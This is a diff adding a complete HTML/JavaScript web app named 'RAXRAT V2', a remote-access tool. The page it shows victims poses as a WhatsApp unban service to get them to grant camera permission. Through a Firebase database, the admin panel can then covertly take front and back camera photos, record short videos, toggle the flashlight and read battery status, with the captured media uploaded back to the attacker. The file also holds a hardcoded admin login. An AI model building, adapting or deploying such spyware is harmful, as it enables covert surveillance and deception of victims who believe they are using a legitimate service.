@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RAXRAT V2 | ULTIMATE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+        body { background: #000; color: #fff; font-family: 'JetBrains Mono', monospace; }
+        .rax-card { background: rgba(15,15,15,0.95); border: 1px solid #222; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .neon-green { color: #00ff88; text-shadow: 0 0 10px #00ff8844; }
+        .hidden { display: none !important; }
+        button { transition: all 0.2s; }
+        button:active { transform: scale(0.95); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div id="boxAuth" class="w-full max-w-sm p-10 rax-card">
+        <h1 class="text-3xl font-black neon-green italic text-center mb-8">RAXRAT V2</h1>
+        <div class="space-y-4">
+            <input type="text" id="usr" placeholder="USER" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none text-green-400">
+            <input type="password" id="pwd" placeholder="PASS" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-xl outline-none text-green-400">
+            <div class="flex gap-2">
+                <button onclick="doAuth('reg')" class="flex-1 py-4 bg-zinc-800 text-zinc-500 rounded-xl font-bold uppercase text-[10px]">Register</button>
+                <button onclick="doAuth('login')" class="flex-1 py-4 bg-green-600 text-black font-black rounded-xl uppercase text-[10px]">Login</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashAdmin" class="hidden w-full max-w-5xl space-y-4">
+        <div class="rax-card p-6 flex justify-between items-center border-l-4 border-green-500">
+            <div>
+                <h2 class="font-bold neon-green italic">SYSTEM MONITOR</h2>
+                <p id="targetStatus" class="text-[10px] text-zinc-500 mt-1 uppercase">Target: <span class="text-red-500">Offline</span></p>
+            </div>
+            <button onclick="location.reload()" class="text-[10px] text-red-500 underline uppercase">Logout</button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div class="rax-card p-5 space-y-4">
+                <p class="text-[10px] text-zinc-600 font-bold uppercase">Flash & Power</p>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="sendCmd('SENTER_ON')" class="p-3 bg-zinc-900 rounded-lg text-[10px] hover:bg-yellow-500 hover:text-black">🔦 ON</button>
+                    <button onclick="sendCmd('SENTER_OFF')" class="p-3 bg-zinc-900 rounded-lg text-[10px] hover:bg-white hover:text-black">🌑 OFF</button>
+                    <button onclick="sendCmd('SENTER_BLINK')" class="col-span-2 p-3 bg-zinc-900 border border-yellow-900/30 text-yellow-500 rounded-lg text-[10px]">🚨 MODE KEDAP-KEDIP</button>
+                </div>
+            </div>
+
+            <div class="rax-card p-5 space-y-4">
+                <p class="text-[10px] text-zinc-600 font-bold uppercase">Visual Hijack</p>
+                <div class="grid grid-cols-2 gap-2 text-[9px] font-bold">
+                    <button onclick="sendCmd('SNAP_FRONT')" class="p-3 bg-blue-900/20 text-blue-400 rounded-lg border border-blue-900/30">📸 FOTO DEPAN</button>
+                    <button onclick="sendCmd('SNAP_BACK')" class="p-3 bg-blue-900/20 text-blue-400 rounded-lg border border-blue-900/30">📸 FOTO BELAKANG</button>
+                    <button onclick="sendCmd('REC_FRONT')" class="p-3 bg-red-900/20 text-red-400 rounded-lg border border-red-900/30">🎥 VID DEPAN</button>
+                    <button onclick="sendCmd('REC_BACK')" class="p-3 bg-red-900/20 text-red-400 rounded-lg border border-red-900/30">🎥 VID BELAKANG</button>
+                </div>
+            </div>
+
+            <div class="rax-card p-5">
+                <p class="text-[10px] text-zinc-600 font-bold uppercase mb-2">Logs & Device Info</p>
+                <div id="logs" class="h-40 overflow-y-auto text-[9px] text-green-500 space-y-1 p-2 bg-black/50 rounded-lg border border-zinc-900">
+                    > Waiting for target...
+                </div>
+            </div>
+        </div>
+
+        <div id="mediaBox" class="rax-card p-4 hidden">
+            <p class="text-[10px] text-zinc-600 font-bold uppercase mb-2 text-center">Inbound Media</p>
+            <div class="flex justify-center bg-black rounded-xl overflow-hidden max-h-96">
+                <img id="resImg" class="hidden max-w-full">
+                <video id="resVid" controls class="hidden max-w-full"></video>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashUser" class="hidden w-full max-w-md p-10 rax-card text-center border-t-4 border-blue-600 shadow-2xl">
+        <h2 class="text-2xl font-black mb-4 italic">UNBAN WHATSAPP</h2>
+        <p class="text-[10px] text-zinc-500 mb-8 tracking-widest leading-loose">SEDANG MENYAMBUNGKAN KE ENKRIPSI DATABASE...<br>JANGAN TUTUP HALAMAN INI.</p>
+        <div id="bindingOverlay" class="space-y-6">
+            <div class="text-6xl animate-pulse">🛰️</div>
+            <button onclick="startBinding()" id="btnBind" class="w-full py-5 bg-white text-black font-black rounded-full tracking-widest text-xs">SINKRONISASI SEKARANG</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = { databaseURL: "https://ralxaratpronect-default-rtdb.asia-southeast1.firebasedatabase.app/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const cmdRef = db.ref("raxrat_v2/control");
+        const statusRef = db.ref("raxrat_v2/status");
+        const mediaRef = db.ref("raxrat_v2/media");
+
+        let currentRole = "";
+        let blinkInterval = null;
+        let localDB = JSON.parse(localStorage.getItem('raxDB')) || { "Ralxa": "Rata" };
+
+        function doAuth(mode) {
+            const u = document.getElementById('usr').value;
+            const p = document.getElementById('pwd').value;
+            if (mode === 'reg') {
+                localDB[u] = p; localStorage.setItem('raxDB', JSON.stringify(localDB));
+                alert("SUKSES REGISTRASI!"); return;
+            }
+            if (u === "Ralxa" && p === "Rata") { currentRole = "admin"; initAdmin(); } 
+            else if (localDB[u] === p) { currentRole = "target"; initTarget(u); }
+            else { alert("ERROR!"); }
+        }
+
+        // --- ADMIN ---
+        function initAdmin() {
+            document.getElementById('boxAuth').classList.add('hidden');
+            document.getElementById('dashAdmin').classList.remove('hidden');
+            
+            statusRef.on("value", (snap) => {
+                const d = snap.val();
+                document.getElementById('targetStatus').innerHTML = (d && d.online) ? 
+                    `Target: <span class="text-green-500 font-bold">ONLINE (${d.user}) | 🔋 ${d.bat || '??'}%</span>` : 
+                    `Target: <span class="text-red-500 font-bold">OFFLINE</span>`;
+                if(d && d.bat) log(`INFO: Target Battery ${d.bat}%`);
+            });
+
+            mediaRef.on("value", (snap) => {
+                const d = snap.val();
+                if(!d) return;
+                document.getElementById('mediaBox').classList.remove('hidden');
+                if(d.type === 'img') {
+                    document.getElementById('resVid').classList.add('hidden');
+                    const i = document.getElementById('resImg'); i.src = d.data; i.classList.remove('hidden');
+                } else if(d.type === 'vid') {
+                    document.getElementById('resImg').classList.add('hidden');
+                    const v = document.getElementById('resVid'); v.src = d.data; v.classList.remove('hidden');
+                }
+                log(`MEDIA: New ${d.type} received!`);
+            });
+        }
+
+        function sendCmd(act) { cmdRef.set({ action: act, time: Date.now() }); log(`SENT: ${act}`); }
+        function log(m) { const l = document.getElementById('logs'); l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }
+
+        // --- TARGET ---
+        function initTarget(user) {
+            document.getElementById('boxAuth').classList.add('hidden');
+            document.getElementById('dashUser').classList.remove('hidden');
+            
+            // Get Battery
+            navigator.getBattery().then(b => {
+                const updateBat = () => statusRef.set({ online: true, user, bat: Math.round(b.level * 100) });
+                updateBat();
+                statusRef.onDisconnect().set({ online: false, user: "none" });
+            });
+
+            cmdRef.on("value", (snap) => {
+                if (currentRole !== "target") return;
+                const d = snap.val(); if(!d) return;
+
+                // Stop any blink first (Fix Bug)
+                if(blinkInterval) { clearInterval(blinkInterval); blinkInterval = null; }
+
+                if (d.action === "SENTER_ON") toggleFlash(true);
+                else if (d.action === "SENTER_OFF") toggleFlash(false);
+                else if (d.action === "SENTER_BLINK") {
+                    let s = true;
+                    blinkInterval = setInterval(() => { toggleFlash(s); s = !s; }, 300);
+                }
+                else if (d.action === "SNAP_FRONT") capture('user', 'img');
+                else if (d.action === "SNAP_BACK") capture('environment', 'img');
+                else if (d.action === "REC_FRONT") capture('user', 'vid');
+                else if (d.action === "REC_BACK") capture('environment', 'vid');
+            });
+        }
+
+        async function toggleFlash(on) {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const t = s.getVideoTracks()[0];
+                await t.applyConstraints({ advanced: [{ torch: on }] });
+                if(!on) s.getTracks().forEach(tr => tr.stop());
+                window.curStr = s;
+            } catch(e) {}
+        }
+
+        async function capture(mode, type) {
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            
+            if(type === 'img') {
+                setTimeout(() => {
+                    const c = document.createElement('canvas');
+                    c.width = 480; c.height = 640;
+                    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                    mediaRef.set({ type: 'img', data: c.toDataURL('image/jpeg', 0.5) });
+                    s.getTracks().forEach(t => t.stop());
+                }, 1000);
+            } else {
+                const chunks = [];
+                const rec = new MediaRecorder(s);
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => mediaRef.set({ type: 'vid', data: reader.result });
+                    reader.readAsDataURL(blob);
+                };
+                rec.start();
+                setTimeout(() => { rec.stop(); s.getTracks().forEach(t => t.stop()); }, 3000); // 3 Detik
+            }
+        }
+
+        function startBinding() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                alert("SINKRONISASI BERHASIL!");
+                document.getElementById('btnBind').innerHTML = "SYSTEM READY ✅";
+                s.getTracks().forEach(t => t.stop());
+            });
+        }
+    </script>
+</body>
+</html>
